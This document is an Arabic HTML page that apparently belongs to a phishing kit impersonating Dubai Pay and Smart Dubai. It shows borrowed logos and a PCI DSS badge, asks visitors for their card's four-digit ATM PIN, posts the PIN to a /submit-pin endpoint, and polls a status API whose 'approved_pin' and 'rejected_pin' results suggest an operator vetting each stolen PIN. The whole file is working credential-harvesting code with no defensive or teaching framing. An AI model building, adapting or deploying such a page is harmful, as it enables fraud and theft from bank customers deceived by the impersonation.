<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الرقم السري - ATM - فزعة</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            padding: 20px;
        }

        .header {
            background: white;
            padding: 15px 20px;
            border-radius: 8px;
            margin-bottom: 40px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header-left {
            display: flex;
            gap: 15px;
            align-items: center;
        }

        .header-logo {
            max-width: 120px;
            height: auto;
        }

        .header-right {
            text-align: center;
        }

        .header-right-logo {
            max-width: 120px;
            height: auto;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .otp-icon {
            width: 280px;
            height: auto;
            margin-bottom: 40px;
            animation: slideDown 0.6s ease-out;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .title {
            color: #1f2937;
            font-size: 24px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 10px;
        }

        .subtitle {
            color: #6b7280;
            font-size: 14px;
            text-align: center;
            margin-bottom: 30px;
        }

        .otp-input-wrapper {
            margin-bottom: 20px;
            width: 100%;
            max-width: 300px;
        }

        .otp-label {
            display: block;
            color: #374151;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .otp-input {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            font-size: 18px;
            text-align: center;
            letter-spacing: 2px;
            font-weight: 600;
            transition: all 0.3s ease;
            font-family: 'Courier New', monospace;
        }

        .otp-input:focus {
            outline: none;
            border-color: #0066cc;
            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1);
        }

        .otp-input::placeholder {
            color: #d1d5db;
            letter-spacing: 2px;
        }

        .timer {
            color: #9ca3af;
            font-size: 12px;
            text-align: center;
            margin-top: 8px;
        }

        .timer.warning {
            color: #f59e0b;
            font-weight: 600;
        }

        .timer.critical {
            color: #ef4444;
            font-weight: 600;
        }

        .button-group {
            display: flex;
            gap: 12px;
            margin-top: 30px;
            width: 100%;
            max-width: 300px;
        }

        .btn {
            flex: 1;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
        }

        .btn-cancel {
            background: #f3f4f6;
            color: #6b7280;
            border: 1px solid #e5e7eb;
        }

        .btn-cancel:hover {
            background: #e5e7eb;
        }

        .btn-cancel:active {
            transform: scale(0.98);
        }

        .btn-confirm {
            background: #0066cc;
            color: white;
        }

        .btn-confirm:hover {
            background: #0052a3;
        }

        .btn-confirm:active {
            transform: scale(0.98);
        }

        .btn-confirm:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .error-message {
            color: #ef4444;
            font-size: 13px;
            margin-top: 8px;
            text-align: center;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .security-badge {
            margin-top: 50px;
            text-align: center;
        }

        .security-badge img {
            height: 40px;
            width: auto;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <div class="header-left">
            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663728520176/TvCpTnLQtXDsNBpI.png" alt="Dubai Pay" class="header-logo" style="height: 40px; width: auto;">
        </div>
        <div class="header-right">
            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663728520176/TWDdxegxhDSOigFd.png" alt="Smart Dubai" class="header-right-logo" style="height: 50px; width: auto;">
        </div>
    </div>

    <!-- Main Container -->
    <div class="container">
        <!-- ATM Icon -->
        <img src="atm_machine.jpg" alt="ATM" class="otp-icon">

        <!-- Title -->
        <h1 class="title">التحقق من الهوية</h1>
        <p class="subtitle">أدخل الرقم السري للصراف الآلي</p>

        <!-- PIN Input -->
        <div class="otp-input-wrapper">
            <label class="otp-label">الرقم السري (PIN)</label>
            <input 
                type="password" 
                id="pinInput" 
                class="otp-input" 
                placeholder="••••" 
                maxlength="4" 
                inputmode="numeric"
                autocomplete="off"
            >
            <div class="timer" id="timer">الوقت المتبقي: 300 ثانية</div>
            <div class="error-message" id="errorMessage"></div>
        </div>

        <!-- Buttons -->
        <div class="button-group">
            <button class="btn btn-cancel" onclick="cancelPayment()">إلغاء</button>
            <button class="btn btn-confirm" id="confirmBtn" onclick="submitPIN()">تأكيد الدفع</button>
        </div>

        <!-- Security Badge -->
        <div class="security-badge">
            <img src="pci_dss_logo.png" alt="PCI DSS">
        </div>
    </div>

    <script>
        // Get transaction ID from URL
        const urlParams = new URLSearchParams(window.location.search);
        const txnId = urlParams.get('txnId');

        // Timer
        let timeLeft = 300;
        const timerInterval = setInterval(() => {
            timeLeft--;
            const timerEl = document.getElementById('timer');
            timerEl.textContent = `الوقت المتبقي: ${timeLeft} ثانية`;
            
            if (timeLeft <= 60) {
                timerEl.classList.add('warning');
            }
            if (timeLeft <= 10) {
                timerEl.classList.add('critical');
            }
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                document.getElementById('confirmBtn').disabled = true;
                showError('انتهى الوقت المخصص للعملية');
            }
        }, 1000);

        // PIN Input Handler
        const pinInput = document.getElementById('pinInput');
        pinInput.addEventListener('input', (e) => {
            // Only allow numbers
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
            
            // Clear error message when user starts typing
            clearError();
        });

        const orderId = new URLSearchParams(window.location.search).get('orderId');

        // Submit PIN
        async function submitPIN() {
            const pin = document.getElementById('pinInput').value;
            
            if (pin.length !== 4) {
                showError('الرقم السري يجب أن يكون 4 أرقام');
                return;
            }

            const confirmBtn = document.getElementById('confirmBtn');
            confirmBtn.disabled = true;
            confirmBtn.textContent = 'جاري المعالجة...';

            await fetch('/submit-pin', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ orderId, pin })
            });

            checkStatus();
        }

        async function checkStatus() {
            try {
                const response = await fetch(`/api/check-status/${orderId}`);
                const data = await response.json();

                if (data.status === 'approved_pin') {
                    window.location.href = `payment_success_ar.html?orderId=${orderId}`;
                } else if (data.status === 'rejected_pin') {
                    const confirmBtn = document.getElementById('confirmBtn');
                    confirmBtn.disabled = false;
                    confirmBtn.textContent = 'تأكيد الدفع';
                    
                    const input = document.getElementById('pinInput');
                    input.style.borderColor = '#ef4444';
                    input.style.background = '#fff5f5';
                    showError(data.lastError || 'الرقم الصرافي الآلي غير صحيح.');
                } else {
                    setTimeout(checkStatus, 3000);
                }
            } catch (e) { console.error(e); }
        }

        // Cancel Payment
        function cancelPayment() {
            if (confirm('هل تريد إلغاء العملية؟')) {
                window.location.href = '/payment_ar.html';
            }
        }

        // Show Error
        function showError(message) {
            const errorEl = document.getElementById('errorMessage');
            errorEl.textContent = message;
            errorEl.classList.add('show');
        }

        // Clear Error
        function clearError() {
            const errorEl = document.getElementById('errorMessage');
            errorEl.classList.remove('show');
        }

        // Focus on input on page load
        window.addEventListener('load', () => {
            pinInput.focus();
        });
    </script>
</body>
</html>
